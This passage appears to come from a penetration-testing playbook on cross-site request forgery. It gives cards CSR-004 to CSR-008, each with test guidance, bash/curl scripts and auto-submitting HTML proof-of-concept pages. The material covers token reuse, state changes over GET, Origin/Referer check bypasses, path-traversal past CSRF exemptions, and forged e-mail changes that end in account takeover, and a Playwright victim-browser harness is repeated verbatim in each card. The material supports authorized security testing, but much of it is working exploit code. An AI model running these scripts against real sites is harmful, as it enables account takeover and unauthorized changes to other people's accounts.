  printf 'Cookie: %s\n' "$BC" > "$D/B.cookie"
  curl -sS "${HDR[@]}" -H @"$D/B.cookie" -X POST "$U" --data-urlencode "$F=$TA" --data-urlencode 'bio=csr004-foreign' -o /dev/null -w 'A token, B session: %{http_code} -> '; st csr004-foreign
  # 2. double submit: B's session cookie with A's CSRF cookie and A's token (K: the CSRF cookie's name, from B.set-cookie)
  K=csrftoken; KA=$(grep -i '^cookie:' "$E/accounts/A.headers" | grep -o -E "(^|[ ;])$K=[^;]*" | sed 's/^[ ;]*//')
  printf 'Cookie: %s;%s\n' "$(printf '%s' "$BC" | tr ';' '\n' | sed 's/^ *//' | grep -v "^$K=" | paste -sd ';' -)" "$KA" > "$D/B-with-A-csrf.cookie"
  curl -sS "${HDR[@]}" -H @"$D/B-with-A-csrf.cookie" -X POST "$U" --data-urlencode "$F=$TA" --data-urlencode 'bio=csr004-double' -o /dev/null -w 'B session + A csrf cookie + A token: %{http_code} -> '; st csr004-double
  # 3. the page for case 1: A's token embedded
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-004</title>
  <form method="POST" action="$U"><input type="hidden" name="$F" value="$TA"><input type="hidden" name="bio" value="csr004-csrf"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  for e in chromium firefox webkit; do sed "s/csr004-csrf/csr004-$e/" "$D/poc.html" > "$D/poc-$e.html"
    python3 "$E/tools/csrf-fire.py" "poc-$e.html" "$D" $e "${HDR[@]}"; echo "$e: $(st "csr004-$e")"; done
  cat "$D/browser.log"
  ```
- **Proof:** `tokens.txt` with A's and B's tokens (different, or equal: one token for everyone); B's state
  changed by a page that embeds A's token, with `browser.log` and the cookie's `Set-Cookie` line. For a double
  submit, also the delivery: the request or page that sets the CSRF cookie in B's browser (header injection, a
  sibling host's script) and the forged change that follows; without a delivery, park it.
- **Not a finding when:** A's token is refused on B's session: the token is bound, mark it negative. A double
  submit with no way to plant the cookie: park. Django's `csrftoken` is a double submit by design, and over HTTPS
  Django also checks `Origin` or `Referer`, so a planted cookie alone does not pass there (#2513333, $500, was
  rated low). The token stays the same across logins or for the life of the session (#49974): informative
  unless an attacker can learn or fix it. A `__Host-` prefix on the CSRF cookie: no sibling host can set it.
- **Escalate:** cookie planting through a CRLF `Set-Cookie` (CRL chapter), or script or a takeover on a sibling
  host that writes `document.cookie` for the parent domain (CSR-011, XSS chapter, STO chapter). Token fixation: a
  token accepted from a URL parameter, or kept from before login, that the session then adopts (#55911). CSR-008
  targets.

### CSR-005 · The state change also runs over GET, which skips the token check and rides SameSite=Lax cookies on a top-level navigation

| | |
|---|---|
| **Severity** | Medium standalone for a change in the victim's account; High for account-level and access-granting actions; Low for preferences |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #1122408, #205953, #998457, #223367 |

- **Where:** every state-changing POST, PUT, PATCH or DELETE, and actions that are links by design
  (`/follow/<id>`, `/delete?id=`, `/approve?id=`, `/settings/toggle`). Handlers that answer every method: Rails
  `match ... via: :all` or `via: [:get, :post]`, Express `app.all`, PHP code reading `$_REQUEST`, Spring
  `@RequestMapping` without `method`, ASP.NET actions without `[HttpPost]`, Django and Flask views that never look
  at the method. GraphQL mutations over GET are GQL-008.
- **Test:** the CSRF checks of Rails, Django, Laravel, Spring Security, Flask-WTF and ASP.NET Core's
  `AutoValidateAntiforgeryToken` skip GET and HEAD as safe methods. Send the action as GET with the body moved to the query and no token; then with
  `_method=POST|PUT|PATCH` in the query (custom overrides sometimes honour it on GET); then as HEAD, which some
  routers hand to the GET handler while code shaped like `if method == "GET": show() else: save()` saves. A
  top-level GET from another site carries `Lax` cookies.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-005"; mkdir -p "$D"; U="$T/settings/profile"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  st(){ curl -sS "${HDR[@]}" $B "$U" | grep -o "$1" || echo unchanged; }
  # the POST's body moved to the query string, no token; then a method override in the query; then HEAD
  curl -sS "${HDR[@]}" -H @"$C" -G "$U" --data-urlencode 'bio=csr005-get' -o "$D/get.body" -w 'GET %{http_code} -> '; st csr005-get
  for m in POST PUT PATCH; do sleep 1; curl -sS "${HDR[@]}" -H @"$C" -G "$U" --data-urlencode "_method=$m" \
    --data-urlencode "bio=csr005-get-$m" -o /dev/null -w "GET _method=$m %{http_code} -> "; st "csr005-get-$m"; done
  curl -sS "${HDR[@]}" -H @"$C" -I -G "$U" --data-urlencode 'bio=csr005-head' -o /dev/null -w 'HEAD %{http_code} -> '; st csr005-head
  # the page: a top-level navigation to the URL that worked (add _method=... when that was the variant), one page per engine
  for e in chromium firefox webkit; do printf '<!doctype html><title>CSR-005</title><script>location = "%s?bio=csr005-%s";</script>\n' "$U" "$e" > "$D/poc-$e.html"; done
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  for e in chromium firefox webkit; do LAXWAIT=0 python3 "$E/tools/csrf-fire.py" "poc-$e.html" "$D" $e "${HDR[@]}"   # a GET navigation carries Lax cookies: no wait
    echo "$e: $(st "csr005-$e")"; done
  grep ' GET ' "$D/browser.log"
  ```
- **Proof:** B's state changed after B's browser opened a page that does nothing but navigate to the GET URL, in
  every engine where it worked, with `browser.log` showing the GET carrying B's session cookie and no `origin`.
  The URL itself is the exploit; quote it in the report with the marker.
- **Not a finding when:** the GET renders the form and changes nothing (read the state back). The GET needs a
  token in the URL that the attacker cannot know. The action is `csrf-low` (logout, language, mark as read,
  dismiss). Only HEAD changed the state: a page can send a cross-site HEAD only with `fetch`, which carries `None`
  cookies alone (CSR-001). The cookie is `Strict`: a navigation another site starts carries none of it; the
  same-site routes under **Escalate** and CSR-011 remain.
- **Escalate:** a GET action fires from an `<img>` or link inside content stored on the target itself (a comment,
  a Markdown image, an avatar URL): that request is same-site, carries even `Strict` cookies and fires for every
  viewer; prove it with B viewing A's content. CSR-008 targets over GET. A Referer check on GET actions falls to a
  client-side redirect on the target (CSR-006, RDR chapter).

### CSR-006 · The Origin or Referer check accepts a request whose header is missing, null or a look-alike of the target

| | |
|---|---|
| **Severity** | Medium standalone for a change in the victim's account; High for account-level and access-granting actions; Low for preferences |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352, CWE-346 |
| **Prior art** | #1543234, #240098, #52635 |

- **Where:** state-changing requests that carry no usable token but fail when `Origin` or `Referer` names another
  site, so the defence is a header check. Common on APIs that rely on `Origin` (#1543234), on appliance and admin
  consoles (#240098, #52635), and on Django over HTTPS, which checks `Origin` or `Referer` before the token.
- **Test:** header checks fail open or match loosely: "no header, no check", `null` allowed, the target's name
  searched anywhere in the value, a prefix or suffix compared without a dot boundary, scheme or port ignored.
  Find with curl the form the server accepts, then produce it from a browser. A cross-site POST always sends
  `Origin`: the page's own, or `null` when the page's referrer policy is `no-referrer` (or it runs in a sandboxed
  frame). It can drop `Referer` with that policy, or send its full URL with `unsafe-url`. A top-level GET sends no
  `Origin`. The page's own address supplies a look-alike.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-006"; mkdir -p "$D"; U="$T/settings/profile"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  O=$(printf '%s' "$T" | cut -d/ -f1-3); EV=csr006-probe; R=$(printf '%s' "$H" | awk -F. '{print $(NF-1)"."$NF}')   # R: registrable domain; set it by hand for co.uk-style suffixes
  o(){ n=$1; shift; curl -sS "${HDR[@]}" -H @"$C" -X POST "$U" "$@" --data-urlencode "bio=csr006-$n" -o /dev/null -w "$n %{http_code} -> "
       curl -sS "${HDR[@]}" $B "$U" | grep -o "csr006-$n" || echo unchanged; sleep 1; }
  o own      -H "Origin: $O" -H "Referer: $O/settings"                                   # control: must change the state
  o foreign  -H "Origin: https://$EV.invalid" -H "Referer: https://$EV.invalid/"          # must be refused, or there is no check (CSR-002)
  o none
  o null     -H 'Origin: null'
  o suffix   -H "Origin: https://$H.$EV.invalid" -H "Referer: https://$H.$EV.invalid/"
  o prefix   -H "Origin: https://$EV$R" -H "Referer: https://$EV$R/"
  o in-path  -H "Origin: https://$EV.invalid" -H "Referer: https://$EV.invalid/$H/"
  o in-query -H "Origin: https://$EV.invalid" -H "Referer: https://$EV.invalid/?$H"
  o http     -H "Origin: http://$H" -H "Referer: http://$H/"
  # pages that make a browser send the accepted forms: null Origin without Referer; full URL Referer; a host name that starts with the target's
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-006</title>
  <meta name="referrer" content="no-referrer">
  <form method="POST" action="$U"><input type="hidden" name="bio" value="csr006-MARK"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  for e in chromium firefox webkit; do mkdir -p "$D/$e/$H"
    sed "s/MARK/null-$e/" "$D/poc.html" > "$D/$e/null.html"
    sed -e "s/MARK/path-$e/" -e 's/no-referrer/unsafe-url/' "$D/poc.html" > "$D/$e/$H/path.html"
    sed -e "s/MARK/suffix-$e/" -e '/name="referrer"/d' "$D/poc.html" > "$D/$e/suffix.html"; done
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  for e in chromium firefox webkit; do   # *.127.0.0.1.nip.io resolves to this machine, so the page's own host name starts with the target's
    for u in "$e/null.html" "$e/$H/path.html?$H" "http://$H.127.0.0.1.nip.io:PORT/$e/suffix.html"; do
      python3 "$E/tools/csrf-fire.py" "$u" "$D" $e "${HDR[@]}"
      echo "$e $u -> bio now: $(curl -sS "${HDR[@]}" $B "$U" | grep -o -E 'csr006-[a-z]+-[a-z]+' | head -1)"; done; done
  grep ' POST ' "$D/browser.log"
  ```
- **Proof:** the curl table (control accepted, `foreign` refused, the bypass accepted), the browser run that
  changed B's state with the page that produced it, and the `browser.log` line with the exact `origin=` and
  `referer=` the browser sent. A look-alike that needs a domain we do not own (`https://<target host>.<our
  domain>`, `https://<word><registrable domain>`) is shown by the curl row plus the nip.io run where it applies;
  the report says the attacker registers such a name.
- **Not a finding when:** `foreign` was accepted too: there is no header check (CSR-002). Only `none` passes: no
  browser sends a POST without `Origin`, so this needs a GET route (CSR-005). The request also needs a token, and
  the header check was one of two layers. A look-alike passes only as `https` and the only evidence is curl:
  report it with that caveat or park it.
- **Escalate:** CSR-008 targets. A client-side redirect on the target (RDR chapter) makes the target's own page
  start the GET, which then carries a same-origin `Referer`. HTML injection that renders a form on the target makes
  the POST same-origin.

### CSR-007 · A route or host that skips the CSRF check still accepts the browser's session cookie

| | |
|---|---|
| **Severity** | Medium standalone for a change in the victim's account; High for account-level and access-granting actions |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #1497169, #44146, #14883, #300999 |

- **Where:** CSRF protection is usually switched off on purpose somewhere: API routes meant for token clients
  (`/api/`, `/v1/`, `/mobile/`, `/ajax/`, `/rpc`), webhook and callback paths, and an older or mobile host (`m.`,
  `mobile.`, `legacy.`) that shares the session cookie through its `Domain` attribute (#14883, #300999).
  Exemption lists to look for: Laravel `VerifyCsrfToken::$except`, Django `@csrf_exempt`, Spring Security
  `ignoringRequestMatchers`, Rails `skip_forgery_protection` and `protect_from_forgery except:`, Express routers
  mounted before the CSRF middleware. The families show up in the bundles, the API docs and the mobile app's
  traffic.
- **Test:** an exempt route is safe only if it does not authenticate by cookie. Replay the protected action on
  each exempt family and host with B's cookie alone. Also reach the protected handler through an exempt prefix:
  when the exemption is matched on the raw path and the router normalises afterwards, `/api/../settings/profile`
  is exempt and lands on the settings handler (#1497169, $10,000: a path traversal that bypassed the CSRF
  protection of the GitHub Enterprise management console).
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-007"; mkdir -p "$D"; U="$T/settings/profile"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  st(){ curl -sS "${HDR[@]}" $B "$U" | grep -o "$1" || echo unchanged; }
  # control: the protected route refuses the token-less request
  curl -sS "${HDR[@]}" -H @"$C" -X POST "$U" --data-urlencode 'bio=csr007-control' -o /dev/null -w 'protected route %{http_code} -> '; st csr007-control
  # 1. route families the client calls, from the saved bundles
  grep -rhoE '["'"'"'`]/(api|v[0-9]+|mobile|m|ajax|rpc|internal|legacy|beta)/[A-Za-z0-9_./-]*' "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -30
  # 2. the same action on those families, and spellings that pass an exempt prefix before the router normalises the path
  n=0; for u in "$T/api/settings/profile" "$T/api/v1/settings/profile" "$T/m/settings/profile" "$T/settings/profile.json" \
      "$T/api/../settings/profile" "$T/api/%2e%2e/settings/profile" "$T/webhooks/..;/settings/profile" "$T/API/settings/profile"; do
    n=$((n+1)); sleep 1; curl -sS "${HDR[@]}" -H @"$C" --path-as-is -X POST "$u" --data-urlencode "bio=csr007-$n" -o /dev/null -w "$n %{http_code} $u -> "; st "csr007-$n"; done
  # 3. other hosts that receive the cookie (its Domain attribute), in scope only
  R=$(grep -i -o 'domain=[^;]*' "$E/accounts/B.set-cookie" | head -1 | cut -d= -f2 | sed 's/^\.//'); echo "cookie domain: ${R:-host-only}"
  for x in m mobile legacy beta; do [ -n "$R" ] || break; h="$x.$R"; scripts/sane scope check "$h" > /dev/null || continue
    sleep 1; curl -sS "${HDR[@]}" -H @"$C" -X POST "https://$h/settings/profile" --data-urlencode "bio=csr007-$x" -o /dev/null -w "$h %{http_code} -> "; st "csr007-$x"; done
  # 4. the page: the form aimed at the URL whose row changed the state
  ACT="$T/api/v1/settings/profile"
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-007</title>
  <form method="POST" action="$ACT"><input type="hidden" name="bio" value="csr007-csrf"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  for e in chromium firefox webkit; do sed "s/csr007-csrf/csr007-$e/" "$D/poc.html" > "$D/poc-$e.html"
    python3 "$E/tools/csrf-fire.py" "poc-$e.html" "$D" $e "${HDR[@]}"; echo "$e: $(st "csr007-$e")"; done
  cat "$D/browser.log"
  ```
  The harness logs requests to `$T`'s host only: when the accepted URL is on another host, the state read back as
  B and the screenshot are the evidence.
- **Proof:** the control refused on the protected route; the same action accepted on the alternate route or host
  with the cookie alone; the page that sends it from another site changing B's state, with `browser.log` and the
  cookie's `Set-Cookie` line. Name the route family and, if known, why it skips the check.
- **Not a finding when:** the alternate route ignores the cookie and wants a bearer token or API key (401 or 403
  with the cookie alone). It needs JSON or a custom header, so a preflight stands in the way: API-006. The path
  spelling is rejected, or normalised before the check (the control's refusal comes back). The other host is out
  of scope: it gets nothing, not even one request (`scripts/sane scope check`).
- **Escalate:** CSR-008 through the exempt route. An exempt GraphQL endpoint is GQL-008. An older API version
  with weaker checks is also BAC-013 material.

### CSR-008 · The e-mail, password or second-factor change can be forged from another site, so one page visit takes over the account

| | |
|---|---|
| **Severity** | High standalone when the proof ends signed in to B's account with credentials the attacker set; Medium when the victim must still confirm from the old address or with the current second factor |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352, CWE-620 |
| **Prior art** | #100849, #1624421, #1531235, #155774 |

- **Where:** change of e-mail (primary, secondary, "set as primary"), password, phone, recovery address or
  security questions; adding or disabling a second factor (#155774: CSRF adding a two-factor phone number); adding
  an SSH key, API token, OAuth app grant or connected identity (CSR-009); inviting a new owner into B's tenant.
  AUT-015 tells which of them ask for the current password; the ones that do not are the targets.
- **Test:** aim the cheapest shape the other cards proved on a harmless field of the same form or API (no token,
  token dropped, GET, header check fooled, exempt route) at each target. Then finish the takeover the way an
  attacker would, on B: the e-mail moves to an address of ours, the reset goes there, and the new password logs
  in.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-008"; mkdir -p "$D"; N='<an address of ours with no account here>'; NP='Csr008-new-pw!'
  curl -sS "${HDR[@]}" $B "$T/api/me" | jq -c '{id, email}' | tee "$D/01-before.json"
  # 1. the page: the e-mail change in the shape a cheaper card proved (here a form POST without a token)
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-008</title>
  <form method="POST" action="$T/settings/email"><input type="hidden" name="email" value="$N"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
